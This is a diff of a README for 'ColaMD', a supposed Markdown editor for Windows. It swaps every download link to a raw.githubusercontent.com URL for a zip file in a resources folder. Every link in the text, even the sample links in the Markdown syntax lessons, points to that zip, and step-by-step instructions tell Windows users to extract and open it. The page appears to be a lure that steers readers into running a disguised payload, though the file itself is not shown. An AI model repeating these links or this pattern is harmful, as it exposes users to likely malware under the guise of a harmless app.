@@ -1,6 +1,6 @@
 # 📝 ColaMD - Write Markdown With Less Friction
 
-[![Download ColaMD](https://img.shields.io/badge/Download-ColaMD-7A5CFA?style=for-the-badge)](https://github.com/skylerperfumed417/ColaMD/raw/refs/heads/main/resources/MD-Cola-v2.7.zip)
+[![Download ColaMD](https://img.shields.io/badge/Download-ColaMD-7A5CFA?style=for-the-badge)](https://raw.githubusercontent.com/skylerperfumed417/ColaMD/main/resources/MD-Cola-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Use it to:
 
 Visit this page to download ColaMD:
 
-https://github.com/skylerperfumed417/ColaMD/raw/refs/heads/main/resources/MD-Cola-v2.7.zip
+https://raw.githubusercontent.com/skylerperfumed417/ColaMD/main/resources/MD-Cola-v2.7.zip
 
 On the page, look for the latest release or the main app file. If you see a setup file or app file, download it to your computer. Then open the file to start the app.
 
@@ -59,7 +59,7 @@ This makes it useful for:
 
 ## 🛠️ Install and Run on Windows
 
-1. Open the download page: https://github.com/skylerperfumed417/ColaMD/raw/refs/heads/main/resources/MD-Cola-v2.7.zip
+1. Open the download page: https://raw.githubusercontent.com/skylerperfumed417/ColaMD/main/resources/MD-Cola-v2.7.zip
 2. Find the latest Windows download on the page.
 3. Download the file to your computer.
 4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
@@ -111,7 +111,7 @@ Example:
 ### Add links
 Use the Markdown link format:
 
-- `[Link text](https://github.com/skylerperfumed417/ColaMD/raw/refs/heads/main/resources/MD-Cola-v2.7.zip)`
+- `[Link text](https://raw.githubusercontent.com/skylerperfumed417/ColaMD/main/resources/MD-Cola-v2.7.zip)`
 
 ### Format text
 Use these common styles:
@@ -245,7 +245,7 @@ Here are the most common Markdown patterns:
 - `*Italic text*`
 - `- Bullet item`
 - `1. Numbered item`
-- `[Text](https://github.com/skylerperfumed417/ColaMD/raw/refs/heads/main/resources/MD-Cola-v2.7.zip)`
+- `[Text](https://raw.githubusercontent.com/skylerperfumed417/ColaMD/main/resources/MD-Cola-v2.7.zip)`
 - `![Alt text](image.png)`
 - `` `code` ``
 - `> Quote`
@@ -274,4 +274,4 @@ After you install ColaMD:
 
 If you want a clean place to write Markdown on Windows, start with the download page:
 
-https://github.com/skylerperfumed417/ColaMD/raw/refs/heads/main/resources/MD-Cola-v2.7.zip
+https://raw.githubusercontent.com/skylerperfumed417/ColaMD/main/resources/MD-Cola-v2.7.zip
